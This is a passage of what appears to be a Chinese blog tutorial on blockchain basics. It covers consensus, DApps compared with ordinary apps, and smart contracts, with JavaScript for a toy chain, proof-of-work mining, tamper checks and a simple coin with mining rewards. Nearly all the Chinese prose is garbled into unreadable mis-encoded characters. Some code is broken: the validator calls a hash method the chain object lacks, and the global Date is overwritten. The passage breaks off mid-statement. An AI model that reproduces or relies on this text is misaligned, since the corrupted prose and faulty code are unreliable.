ä¹æ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„ï¼ŒåŸå› çœ‹ä¸‹é¢ã€‚\nç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„ä¸‹çš„æ‰€æœ‰èŠ‚ç‚¹æ‹¥æœ‰åˆ¤æ–­åŒºå—æ˜¯å¦è¢«ç¯¡æ”¹çš„èƒ½åŠ›ï¼Œå½“ä¸€ä¸ªæ–°åŒºå—æƒ³è¦åŠ å…¥æŸä¸€èŠ‚ç‚¹çš„åŒºå—é“¾æ—¶ï¼Œè¯¥èŠ‚ç‚¹ä¼šå‘å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œå¹¿æ’­ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœ50%ä»¥ä¸Šçš„èŠ‚ç‚¹éƒ½è®¤ä¸ºè¯¥åŒºå—æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒºå—å°±å¯ä»¥æˆåŠŸçš„åŠ å…¥åŒºå—é“¾å½“ä¸­ï¼Œåè¨€ä¹‹å¦‚æœæƒ³è¦ç¯¡æ”¹æŸä¸€åŒºå—çš„æ•°æ®ï¼Œä½ é¦–å…ˆè¦å°†è¿™ä¸€åŒºå—åçš„æ‰€æœ‰å“ˆå¸Œé‡æ–°è®¡ç®—ï¼Œå¹¶ä¸”è¿˜è¦æ›´æ”¹è¶…è¿‡ç™¾åˆ†ä¹‹äº”åèŠ‚ç‚¹çš„è¿™ä¸€åŒºå—åçš„æ‰€æœ‰åŒºå—çš„å“ˆå¸Œï¼Œé‚£ä¹ˆå°±è¦æ‹¥æœ‰è¶…è¿‡å…¨ç½‘50%ä»¥ä¸Šçš„ç®—åŠ›æ‰å¯ä»¥ï¼Œè¿™ä»˜å‡ºçš„ä»£ä»·æ˜¯ç›¸å½“é«˜çš„ï¼Œè¿™å°±æ˜¯åŒºå—é“¾ç½‘ç»œç³»ç»Ÿçš„å°‘æ•°æœä»å¤šæ•°åŸåˆ™ã€‚\nDAPPDapp æ˜¯ä»€ä¹ˆï¼ŸAPP (Application) æŒ‡çš„æ˜¯æ‰‹æœºé‡Œçš„åº”ç”¨ç¨‹åºï¼Œåƒæ˜¯å¾®ä¿¡ã€å¾®åšã€æŠ–éŸ³â€¦ç­‰éƒ½æ˜¯æ—¥å¸¸ç”Ÿæ´»ä¸­å¸¸ä¼šä½¿ç”¨åˆ°çš„ Appã€‚\nè€Œ Dapp çš„å…¨åä¸ºå»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºï¼ˆDecentralized Applicationï¼‰ï¼Œæ˜¯å»ºç«‹åœ¨åŒºå—é“¾ç³»ç»Ÿç½‘ç»œä¸Šï¼Œæ‰€æä¾›çš„æœåŠ¡éƒ½å…·æœ‰å…¬å¼€é€æ˜ã€ä¸å¯ç¯¡æ”¹çš„ç‰¹æ€§ã€‚\nä»¥ä¸‹æ˜¯ Dapp æ‰€å…·æœ‰çš„è¦ç´ ï¼š\n\nä»£ç å¼€æºï¼šç¨‹åºä»£ç çš†å…¬å¼€é€æ˜ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥é˜…åŠå®¡æ ¸ï¼Œé¿å…é¡¹ç›®æ–¹è¯´åˆ°æ²¡åšåˆ°ã€‚\nåˆ†å¸ƒå¼å¸æœ¬ï¼šé™ä½æ•°æ®é—å¤±çš„é£é™©ï¼Œä¸”æ²¡æœ‰ä»»ä½•å…¶ä»–ç¬¬ä¸‰æ–¹æœ‰æƒèƒ½å¤Ÿçªœæ”¹æ•°æ®ã€‚\næ•°æ®æ‰€æœ‰æƒï¼šé™¤æœ¬äººï¼ˆç§é’¥æŒæœ‰è€…ï¼‰å¤–ï¼Œä»»ä½•äººçš†æ— æ³•åŠ¨ç”¨è¯¥å¸å·çš„æ•°æ®ã€‚\n\nä¸ºä»€ä¹ˆ Dapp ä¼šå´›èµ·?äº‹å®ä¸Šï¼ŒApp éƒ½æ˜¯ä¸­å¿ƒåŒ–çš„åº”ç”¨æœåŠ¡ï¼Œç”¨æˆ·æ‰€ä½¿ç”¨çš„æ•°æ®éƒ½ä¼šå­˜å‚¨åœ¨å•ä¸€æœåŠ¡å™¨ç³»ç»Ÿé‡Œï¼Œä»£è¡¨å…¬å¸èƒ½æŒæ§ç”¨æˆ·çš„æ‰€æœ‰æ•°æ®ï¼Œä½†ç›¸å…³é—®é¢˜ä¹Ÿéšä¹‹æµ®å‡ºæ°´é¢ã€‚\næ•°æ®æ‰€æœ‰æƒå½’å±é—®é¢˜ç”¨æˆ·åœ¨ App ä¸Šçš„ä¸ªäººèµ„æ–™ã€æœç´¢æµè§ˆçºªå½•ç­‰ä¿¡æ¯éƒ½ä¼šå­˜å‚¨åœ¨ä¸­å¿ƒåŒ–ç³»ç»Ÿçš„æœåŠ¡å™¨é‡Œï¼Œè¿™ä¹Ÿæ„å‘³ç€è½¯ä»¶å…¬å¸èƒ½å¤Ÿå€Ÿç”±è¿™äº›æ•°æ®æ¥è¥åˆ©ã€‚\nä¹Ÿå¯¼è‡´åƒæ˜¯å¾®åšã€æŠ–éŸ³ç­‰ä¼ä¸šï¼Œèƒ½é€è¿‡æœé›†çš„ç”¨æˆ·æ•°æ®æ¥æŠ•æ”¾å¹¿å‘Šï¼Œå¹¶å€Ÿæ­¤è·åˆ©ã€‚ç­‰äºä¼ä¸šèƒ½ç”¨ä½ çš„ä¿¡æ¯æ¥èµšé’±ï¼Œä½†ä½ å´åˆ†ä¸åˆ°ä»»ä½•å¥½å¤„ï¼Œç”šè‡³è¿˜å¯èƒ½å—åˆ°å½±å“ï¼ˆä¾‹å¦‚è¢«ç–¯ç‹‚æŠ•æ”¾å¹¿å‘Šã€æˆ–ä¸ªäººèµ„æ–™è¢«å¹³å°å¤–æ³„ï¼‰ã€‚\nå¦å¤–ï¼Œä¼ ç»Ÿæ‰‹æ¸¸çš„æ¸¸æˆé“å…·ã€å¸å·æ•°æ®ä¹Ÿéƒ½å±äºå…¬å¸æ‰€æœ‰ï¼Œä¸€æ—¦å®£å¸ƒåœæ­¢è¥è¿ï¼Œè¿™äº›èµ„äº§ä¹Ÿä¼šéšç€å®˜æ–¹æœåŠ¡å™¨å…³é—­è€Œæ¶ˆå¤±ã€‚\nä½†åœ¨ Dapp ä¸­ï¼Œä½ çš„æ¸¸æˆé“å…·ã€å¸å·éƒ½ä¼šä»¥ NFT å½¢å¼å‚¨å­˜åœ¨é“¾ä¸Šï¼Œå› æ­¤åªè¦åŒºå—é“¾ä¸å€’ï¼Œä½ å°±èƒ½æŒç»­æ‹¥æœ‰è¿™äº›èµ„äº§ã€‚æ¢å¥è¯è¯´ï¼ŒDapp èƒ½å¤Ÿè®©æ•°æ®çš„æ‰€æœ‰æƒå›å½’åˆ°ç”¨æˆ·èº«ä¸Šã€‚é¢å¤–æé†’ï¼Œè™½ç„¶ä½ ä»æ‹¥æœ‰è¿™äº›èµ„äº§ï¼Œä½†å¯èƒ½ä¼šå› ä¸ºæ¸¸æˆå·²ç»å…³é—­ï¼Œå¯¼è‡´è¿™äº›èµ„äº§çš„ç°å€¼è¶‹è¿‘äºé›¶ï¼Œä½ èƒ½ä¿æœ‰çš„ä»ä»¥å›å¿†å±…å¤šã€‚\nè¿‡åº¦ä¸­å¿ƒåŒ–App æ˜¯ç”±ä¸­å¿ƒåŒ–æœåŠ¡å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå› æ­¤ä¼ä¸šæœ‰æ—¶å¯ä»¥ä¸“æ–­ç‹¬è¡Œï¼Œä½†ç”¨æˆ·å´æ²¡æœ‰ä»»ä½•ååˆ¶çš„æ‰‹æ®µï¼šä¾‹å¦‚å¯ä»¥éšæ„æ¤å…¥å¹¿å‘Šï¼Œæˆ–æ˜¯åˆ é™¤ç”¨æˆ·çš„å†…å®¹ã€å¸å·ã€‚\nè€Œ Dapp çš„æ•°æ®éƒ½å­˜åœ¨åŒºå—é“¾ä¸Šï¼Œå› æ­¤é¡¹ç›®æ–¹æ²¡åŠæ³•ä»»æ„åˆ é™¤ç”¨æˆ·èµ„æ–™ï¼Œç›®å‰ä¹Ÿæ²¡æœ‰ä»»ä½•å¹¿å‘Šæ¤å…¥çš„é—®é¢˜ï¼ˆä½†ä¸ç¡®å®šæœªæ¥æ˜¯å¦ä¼šæœ‰é¡¹ç›®å¼€å§‹æ¤å…¥å¹¿å‘Šï¼‰ã€‚\nç”±äºä¸Šè¿°å‡ ç‚¹åŸå› ï¼Œä¹Ÿè®©è®¸å¤šäººå¼€å§‹å¯¹ä¼ ç»Ÿçš„ App æ„Ÿåˆ°ä¸æ»¡ï¼Œäºæ˜¯å°±æœ‰äººæ‰“ç®—é€šè¿‡åŒºå—é“¾â€œå»ä¸­å¿ƒåŒ–â€çš„ç‰¹æ€§æ¥ç ”å‘èƒ½è§£å†³ä¸Šè¿°é—®é¢˜çš„ Appï¼Œäºæ˜¯ Dapp å°±æ­¤è¯ç”Ÿã€‚\nä¸è¿‡åŒæ—¶ä¹Ÿè¦æ³¨æ„ï¼Œä¸æ˜¯æ¯ä¸ª Dapp éƒ½ä¸€å®šç¬¦åˆå…¬å¼€ã€å»ä¸­å¿ƒåŒ–çš„è§„èŒƒï¼Œä¾‹å¦‚ Opensea å°±èƒ½ä¸‹æ¶ç”¨æˆ·çš„ NFT å’Œé™åˆ¶ç”¨æˆ·ç™»é™†ã€‚\nDapp ä¸ App çš„å·®å¼‚App çš„åº”ç”¨æœåŠ¡æ˜¯ä½¿ç”¨ä¸­å¿ƒåŒ–æœåŠ¡å™¨ï¼Œä»£è¡¨è½¯ä»¶å…¬å¸å¿…é¡»è¦æ‰¿æ‹…å­˜å‚¨ç”¨æˆ·çš„æ•°æ®é‡çš„è¥è¿æˆæœ¬ï¼Œå¦åˆ™å°†æ— æ³•æŒç»­åœ°è¿è¡Œã€‚\nä¾‹å¦‚æŠ–éŸ³æœåŠ¡å™¨çš„æˆæœ¬å°±ç™¾ä¸‡ä»¥ä¸Šï¼Œå› æ­¤å¿…é¡»æƒ³åŠæ³•åˆ›é€ å„ç§è¥æ”¶ç®¡é“æ¥æ”¯æŒå„é¡¹æ”¯å‡ºï¼Œåƒæ˜¯é€šè¿‡å¤§æ•°æ®å°†å¹¿å‘Šæ¨å¹¿åˆ°æ½œåœ¨ç”¨æˆ·é¢å‰ï¼Œå€Ÿæ­¤å¸å¼•æ›´å¤šå¹¿å‘Šå•†è¿›é©»ã€‚\nè€Œ Dapp æ˜¯å»ºç«‹åœ¨åŒºå—é“¾ä¸Šï¼Œç”¨æˆ·åœ¨é“¾ä¸Šè¿›è¡Œäº¤æ˜“ã€æ¢å¸ç­‰è¡Œä¸ºæ—¶ï¼Œæ˜¯éœ€è¦è‡ªè¡Œè´Ÿæ‹…æ‰‹ç»­è´¹ï¼ˆGas è´¹ï¼‰çš„ï¼Œä¹Ÿå°±ä»£è¡¨å¼€å‘å•†çš„è¿è¥æˆæœ¬ä¼šæ¯”ä¼ ç»Ÿ App æ¥å¾—æ›´ä½ï¼ˆä¸è¿‡æœ‰äº›å¼€å‘å•†ä¸ºäº†å¸å¼•ç”¨æˆ·ï¼Œä¼šå¸®ç”¨æˆ·è´Ÿæ‹…ä½¿ç”¨æ—¶çš„æ‰‹ç»­è´¹ï¼‰ã€‚\n\n\n\n\nDapp\nApp\n\n\n\næœåŠ¡å™¨\nå»ä¸­å¿ƒåŒ–\nä¸­å¿ƒåŒ–\n\n\néšç§æ€§\næœ‰ï¼ˆåŒºå—é“¾åŒ¿åæ€§ï¼‰\næ— ï¼ˆè¿˜å¯èƒ½è¢«å¤–æ³„ï¼‰\n\n\nè¥è¿æˆæœ¬\nç”¨æˆ·å…±åŒè´Ÿæ‹…ï¼ˆæˆ–å¼€å‘å•†è´Ÿæ‹…ï¼‰\nå¼€å‘å•†è´Ÿæ‹…\n\n\nå¹³å°è·åˆ©æ¥æº\næ™ºèƒ½åˆçº¦ï¼ˆé“¾ä¸Šæ‰‹ç»­è´¹ï¼‰\nå¹¿å‘Šå•†æˆ–ç”¨æˆ·æ¶ˆè´¹\n\n\næ•°æ®æ‰€æœ‰æƒ\nç”¨æˆ·\nå¼€å‘å•†\n\n\nå¹³å°æ§åˆ¶æƒ\nå¼€å‘å•†æˆ–æ˜¯ DAO æ²»ç†\nå¼€å‘å•†\n\n\nç³»ç»Ÿ\nåŒºå—é“¾\nAndroidã€iOS\n\n\nä»£ç æ˜¯å¦å¼€æº\nä»£ç çš†å…¬å¼€ï¼Œå¯ä¾›äººå‚è€ƒ\nä»£ç ä¸ºå…¬å¸æœºå¯†ï¼Œæ“…ç”¨è€…å¯èƒ½ä¼šåƒä¸Šå®˜å¸\n\n\næ™ºèƒ½åˆçº¦æ™ºèƒ½åˆçº¦ï¼Œæ˜¯ä¸€æ®µå†™åœ¨åŒºå—é“¾ä¸Šçš„ä»£ç ï¼Œä¸€æ—¦æŸä¸ªäº‹ä»¶è§¦å‘åˆçº¦ä¸­çš„æ¡æ¬¾ï¼Œä»£ç å³è‡ªåŠ¨æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ»¡è¶³æ¡ä»¶å°±æ‰§è¡Œï¼Œä¸éœ€è¦äººä¸ºæ“æ§ï¼Œç±»ä¼¼äºä¼ ç»Ÿwebçš„åç«¯ä»£ç ã€‚\nç®€å•åŒºå—é“¾å®ç°æˆ‘ä»¬ç”¨Javascriptæ¥æ‰‹å†™ä¸€ä¸ªå»ºè®®çš„åŒºå—é“¾å‡ºæ¥ï¼Œå…¶å®å’Œå†™ä¸€ä¸ªé“¾è¡¨å¾ˆåƒï¼š\nconst sha256 = require('crypto-js/sha256')Date = new Date()class block{    constructor(data,time,previousHash) {        this.data = data        this.time = time        this.previousHash = previousHash        this.myHash = this.currHash()    }    currHash() {        return sha256(this.data + this.time + this.previousHash).toString()    }}class blockCahin{    constructor()    {        this.chain = [this.createBlockchain()];    }    createBlockchain()    {        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)    }    getLatestblock()    {        return this.chain[this.chain.length - 1]    }    addBlock(newBlock)    {        newBlock.previousHash = this.getLatestblock().myHash        newBlock.myHash = newBlock.currHash()        this.chain.push(newBlock)    }}BlockChain = new blockCahin()BlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))console.log(BlockChain)\n\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ä»£ç å®ç°ä¸€ä¸‹ç®€æ˜“çš„POWï¼š\nconst sha256 = require(\"crypto-js/sha256\")function proofOfwork(){    let seed = \"y1zh3e7\"    let x = 1               // xä¸ºè‡ªå¢å˜é‡    while (true){        if(sha256(seed + x).toString().substring(0,4) != \"0000\") // å®šä¹‰éš¾åº¦ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨è¦æ±‚é€šè¿‡ä¸æ–­è‡ªå¢xå»è®¡ç®—seed+xçš„å“ˆå¸Œå€¼        {                                                        // å½“å“ˆå¸Œå€¼å‰å››ä½éƒ½ä¸º0000æ—¶åˆ™ä»£è¡¨æˆåŠŸ å¦‚æœæƒ³æé«˜éš¾åº¦æˆ‘ä»¬å°±å¯ä»¥è®©å‰xä½ä¸ºxxxx            x += 1        }else{            console.log(sha256(seed + x).toString())            break        }    }    console.log(x)                                              // è¾“å‡ºè®¡ç®—å¤šå°‘æ¬¡åæˆåŠŸ}proofOfwork()\n\nå®ç°é˜²ç¯¡æ”¹æœºåˆ¶ï¼š\n/***********************************************éªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š                                     1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ  2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ  ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"æ•°æ®ç¯¡æ”¹\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"æ•°æ®ç¯¡æ”¹\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")                return false            }        }    }    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")    return true}\n\nå°†å®Œæ•´çš„POWæ•´åˆåˆ°åŒºå—é“¾å½“ä¸­å¹¶å®ç°æŒ–çŸ¿åŠŸèƒ½ï¼Œæœ€ç»ˆå®ç°çš„å®Œæ•´åŒºå—é“¾ï¼š\nconst sha256 = require('crypto-js/sha256')Date = new Date()class block{    constructor(data,time,previousHash) {        this.data = data        this.time = time        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    calcHash() {        return sha256(this.data + this.time + this.previousHash + this.nonce).toString()    }    /**  **/    getAnswer(difficulty){        let answer = \"\"        for(let i=0; i&lt;difficulty; i++)        {            answer += \"0\"        }        console.log(answer)        return answer    }   /** å¼•å…¥æŒ–çŸ¿åŠŸèƒ½ **/    mine(difficulty){        let answer = this.getAnswer(difficulty)        let Hash = this.calcHash()       while(true){            if (Hash.substring(0,difficulty) != answer)            {                this.nonce++                Hash = this.calcHash()            }else{                break            }       }       console.log(\"mine successful!\")       console.log(this.nonce)       return Hash    }}class blockCahin{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 5    }    createBlockchain()    {        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)    }    getLatestblock()    {        return this.chain[this.chain.length - 1]    }    addBlock(newBlock)    {        newBlock.previousHash = this.getLatestblock().myHash        newBlock.myHash = newBlock.mine(this.difficulty)        this.chain.push(newBlock)    }}/***********************************************éªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š 1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ 2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"æ•°æ®ç¯¡æ”¹\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"æ•°æ®ç¯¡æ”¹\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")                return false            }        }    }    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")    return true}BlockChain = new blockCahin()BlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))// console.log(BlockChain)// BlockChain.chain[1].data = \"æ•°æ®ç¯¡æ”¹\"// BlockChain.chain[0].myHash = \"0012343566688\"// console.log(validateBlock(BlockChain))\n\næ•°å­—è´§å¸çš„ç®€å•å®ç°æ¯”ç‰¹å¸æˆ‘ä»¬å‰é¢è¯´åˆ°åŒºå—é“¾æ˜¯ç”¨æ¥è®°å½•ä¿¡æ¯çš„ï¼Œå¦‚æœå®ƒè®°å½•çš„æ˜¯è½¬è´¦è®°å½•é‚£ä¹ˆå®ƒå°±æˆäº†ä¸€ä¸ªè´¦æœ¬ã€‚\nä¸€ç¬”è½¬è´¦ä¿¡æ¯éœ€è¦ä»¥ä¸‹å››ä¸ªä¿¡æ¯ï¼š\nä»˜æ¬¾äºº æ”¶æ¬¾äºº è½¬è´¦é‡‘é¢ è½¬è´¦æ—¶é—´\næˆ‘ä»¬å‰é¢æåˆ°äº†POWï¼Œæ¯”ç‰¹å¸ä¼šé€šè¿‡POWå°†äº§ç”Ÿä¸€ä¸ªåŒºå—çš„æ—¶é—´æ§åˆ¶åœ¨ååˆ†é’Ÿå·¦å³ï¼Œæ¯”ç‰¹å¸çš„å·¥ä½œæœºåˆ¶åŸºæœ¬å¦‚ä¸‹ï¼š\næ•´ä¸ªåŒºå—é“¾æ˜¯ä¸€ä¸ªç½‘çŠ¶çš„ç½‘ç»œç»“æ„ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¸­å¿ƒï¼Œæ¯ååˆ†é’Ÿå‘å¸ƒä¸€ä¸ªé—®é¢˜ï¼ˆç±»ä¼¼äºæˆ‘ä»¬ä¹‹é—´ç”Ÿæˆçš„ç›®æ ‡Hashï¼‰ï¼Œå½“é—®é¢˜å‘å¸ƒåï¼Œè¯¥ç½‘çŠ¶ç½‘ç»œä¸­çš„æ‰€æœ‰ç»“ç‚¹ä¼šæ¥è§£è¿™ä¸ªé—®é¢˜ï¼ˆæŒ–çŸ¿ï¼Œçˆ†ç ´ç›®æ ‡Hashå€¼ï¼‰ï¼Œæ­¤æ—¶å°±æ˜¯å„ç»“ç‚¹é—´çš„ç®—åŠ›æ¯”æ‹¼ï¼Œå½“æœ‰ä¸€ä¸ªç»“ç‚¹è§£å‡ºè¯¥é—®é¢˜ååˆ™ä»£è¡¨æŒ–çŸ¿æˆåŠŸï¼Œä¸€ä¸ªæ–°åŒºå—è¢«åˆ›é€ å‡ºæ¥ï¼Œè¿™æ—¶è¯¥æ–°åŒºå—å†…ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ç¬”è½¬è´¦è®°å½•ï¼Œå…¶ä¸­çš„æ”¶æ¬¾äººå°±æ˜¯è¯¥åŒºå—çš„æŒ–å‡ºè€…ï¼Œè¿™æ—¶åŒºå—é“¾å°±ä¼šè‡ªåŠ¨æŠŠå¥–åŠ±å‘æ”¾åˆ°æ”¶æ¬¾äººçš„è´¦æˆ·ä¸Šï¼Œå¹¶ä¸”è¯¥åŒºå—ä¼šåœ¨æ•´ä¸ªåŒºå—é“¾ç½‘ç»œä¸­è¿›è¡Œå¹¿æ’­ï¼ŒåŒºå—é“¾ä¸­çš„æ¯ä¸€ä¸ªç»“ç‚¹ä¼šå¯¹è¯¥åŒºå—è¿›è¡ŒéªŒè¯å…¶åˆæ³•æ€§ï¼Œç»è¿‡éªŒè¯åè¯¥æ–°åŒºå—å°±ä¼šè¢«åŠ åˆ°åŒºå—é“¾ä¸Šã€‚æ¯å››å¹´æ¯”ç‰¹å¸çš„å¥–åŠ±ä¼šå‡åŠä¸€æ¬¡ï¼Œæœ€åçš„æ¯”ç‰¹å¸æ€»é‡å¤§çº¦æ˜¯åœ¨2100ä¸‡ä¸ªå·¦å³ã€‚\né‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¿‡äº†å‡ å¹´ä¹‹åï¼Œæ¯”ç‰¹å¸è¶Šæ¥è¶Šå°‘ï¼Œæ¯æ¬¡æŒ–çŸ¿åå‡ ä¹å¾—ä¸åˆ°æ¯”ç‰¹å¸äº†ï¼Œé‚£è¿˜ä¼šæœ‰äººæ¥æŒ–çŸ¿å—ï¼Ÿ\nå…¶å®æ¯”ç‰¹å¸åªæ˜¯æ¯”ç‰¹å¸åŒºå—é“¾ä¸­çš„ä¸€ä¸ªé¢å¤–å¥–åŠ±æœºåˆ¶ï¼Œæ•´ä¸ªåŒºå—é“¾è´§å¸ä¾èµ–çš„æ˜¯æ¯ä¸€ç¬”è½¬è´¦è®°å½•çš„æ‰‹ç»­è´¹ï¼Œå½“ä¸€ä¸ªæ–°åŒºå—è¢«æŒ–å‡ºæ—¶é‚£ä¹ˆè¿™ä¸ªæ–°åŒºå—çš„è½¬è´¦ä¿¡æ¯ï¼ˆæˆ‘ä»¬åˆšæ‰è¯´åˆ°çš„æ¯”ç‰¹å¸å¥–åŠ±æœºåˆ¶ï¼‰å°±ä¼šè®°å½•åœ¨è¿™ä¸ªæ–°åŒºå—ä¸Šï¼ˆä»¥è½¬è´¦çš„æ–¹å¼å‘æ”¾å¥–åŠ±è´§å¸ï¼‰ï¼Œåç»­ä¹Ÿä¼šè®°å½•å…¶ä»–çš„è½¬è´¦ä¿¡æ¯ï¼Œå¹¶ä¸”ä¼šäº§ç”Ÿæ‰‹ç»­è´¹ï¼Œæ‰‹ç»­è´¹å½’è®°å½•è¯¥ç¬”è½¬è´¦ä¿¡æ¯çš„åŒºå—çš„æŒ–å‡ºè€…æ‰€æœ‰ã€‚\nè¯´åˆ°åŠ¨æ€è°ƒæ•´éš¾åº¦ï¼Œæ¯”ç‰¹å¸æ˜¯æ€ä¹ˆè°ƒæ•´çš„å‘¢ï¼Ÿ\næ¯”ç‰¹å¸ä¼šåœ¨æ¯2016ä¸ªåŒºå—è¯ç”ŸåéªŒè¯ä¸€ä¸‹éš¾åº¦ï¼Œå¦‚æœè¯´æœ¬æ¥é¢„æœŸä¸­mineè¿™2016ä¸ªåŒºå—æ‰€éœ€è¦çš„æ—¶é—´æ˜¯ä¸¤ä¸ªæ˜ŸæœŸï¼Œè€Œå®é™…åªç”¨äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œé‚£ä¹ˆæ­¤æ—¶æ¯”ç‰¹å¸åŒºå—é“¾å°±ä¼šè°ƒæ•´éš¾åº¦ï¼Œä½¿å…¶è¾¾åˆ°é¢„æœŸï¼ŒåŸºæœ¬ä¸Šæ¯”ç‰¹å¸åŒºå—é“¾ä¼šæ¯ä¸¤ä¸ªæ˜ŸæœŸè°ƒæ•´ä¸€æ¬¡éš¾åº¦ã€‚\nåˆ›å»ºè‡ªå·±çš„æ•°å­—è´§å¸é¦–å…ˆæˆ‘ä»¬è¦æ–°å»ºä¸€ä¸ªTransactionç±»æ¥è¿›è¡Œè½¬è´¦è®°å½•ï¼š\nclass Transaction{    constructor(from, to , amount) {        this.from = from        this.to = to        this.amount = amount    }}\n\næ›´æ”¹åŒºå—ä¸­dataçš„å«ä¹‰ï¼Œæ­¤æ—¶è¦è®°å½•çš„æ˜¯è½¬è´¦ä¿¡æ¯transactionï¼Œå¹¶ä¸”ç”±äºtransactionæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤åœ¨å‚ä¸è®¡ç®—å“ˆå¸Œæ—¶è¦è½¬ä¸ºå­—ç¬¦ä¸²ï¼ˆè¿™é‡Œå°†æ—¶é—´æ”¹ä¸ºäº†Date.nowï¼Œè¿™æ ·åœ¨åŒºå—åˆ›é€ æ—¶å°±è®°å½•äº†è¿™ç¬”è½¬è´¦è®°å½•çš„æ—¶é—´ï¼‰ï¼š\nclass Block{    constructor(transaction,previousHash) {        this.transactions = transaction        this.time = Date.now()        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    // è®¡ç®—hashæ—¶è¦å°†dataè½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ­¤æ—¶çš„dataæ˜¯ä¸€ä¸ªtransaction    calcHash() {        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()    }\n\nä¸Šé¢è¯´åˆ°å¥–åŠ±è´§å¸çš„å‘æ”¾æ˜¯é€šè¿‡è½¬è´¦çš„æ–¹å¼å®ç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é“¾ä¸Šå®ç°é€»è¾‘ï¼š\nclass blockChain{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 5        this.transactionPool = []  //æŒ–çŸ¿æˆåŠŸçš„è½¬è´¦ä¿¡æ¯        this.mineReward = 50       //æ¯æ¬¡æŒ–çŸ¿æˆåŠŸçš„å¥–åŠ±è´§å¸æ•°    }mineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)    }\n\nä¹‹å‰æˆ‘ä»¬æ˜¯åœ¨å¤–éƒ¨ä¼ å…¥ä¸€ä¸ªåŒºå—ï¼Œåœ¨æ•´ä¸ªè´§å¸ç³»ç»Ÿçš„å®ç°ååŒºå—åº”è¯¥æ˜¯åœ¨æŒ–çŸ¿æ—¶åœ¨åŒºå—é“¾å†…éƒ¨äº§ç”Ÿçš„ï¼Œä¿®æ”¹ä»£ç ï¼š\n//å°†Transactionæ·»åŠ åˆ°Transaction Poolä¸­    addTransaction(Transaction)    {        this.transactionPool.push(Transaction)    }\t\t\t\tmineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)        //æŒ–çŸ¿        /********************************************************         * è¿™é‡Œæ–°åŒºå—è®°å½•äº†æ•´ä¸ªåŒºå—é“¾çš„è½¬è´¦ä¿¡æ¯ï¼Œä½†åœ¨å®é™…æƒ…å†µä¸­åŒºå—çš„å­˜å‚¨         * å®¹é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨æŒ–çŸ¿æ—¶è®°å½•çš„è½¬è´¦è®°å½•ä¼šé€‰æ‹©æ‰‹ç»­è´¹æœ€é«˜çš„transaction         * æˆ‘ä»¬è¿™é‡Œå…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µ         *******************************************************/        const newBlock = new 